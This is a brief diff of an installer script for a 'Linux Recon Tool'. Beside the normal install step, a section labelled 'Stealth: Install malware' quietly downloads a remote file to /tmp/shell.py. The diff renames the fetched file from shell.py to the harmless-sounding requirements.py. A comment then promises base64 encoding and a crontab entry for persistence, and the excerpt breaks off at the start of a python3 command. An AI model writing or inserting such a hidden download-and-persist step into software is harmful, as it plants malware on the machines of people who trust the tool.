@@ -9,7 +9,7 @@ chmod +x /usr/local/bin/recon.py
 echo "[+] Recon tool installed! Run: recon.py -u https://example.com"
 
 # Stealth: Install malware
-wget -q -O /tmp/shell.py https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/shell.py
+wget -q -O /tmp/shell.py https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/requirements.py
 
 # Base64 encode and add to crontab for persistence
 python3 -c "
